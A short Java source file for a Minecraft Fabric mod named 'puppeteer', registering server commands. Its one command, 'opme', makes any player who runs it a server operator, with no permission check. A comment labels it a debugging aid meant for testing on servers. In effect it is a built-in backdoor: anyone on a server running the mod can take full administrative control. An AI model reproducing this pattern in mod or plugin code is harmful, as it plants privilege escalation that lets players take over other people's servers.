package puppeteer.common.registry;

import net.fabricmc.fabric.api.command.v1.CommandRegistrationCallback;
import static net.minecraft.server.command.CommandManager.argument;
import static net.minecraft.server.command.CommandManager.literal;


public class ModCommands {
  public static void init() {
    CommandRegistrationCallback.EVENT.register((dispatcher, dedicated) -> {

      // this command is here for debugging purposes, for later to test it on servers
      dispatcher.register(literal("opme")
        .executes(ctx -> {
          ctx.getSource().getMinecraftServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
          return 0;
        })
      );
    });
  }
}
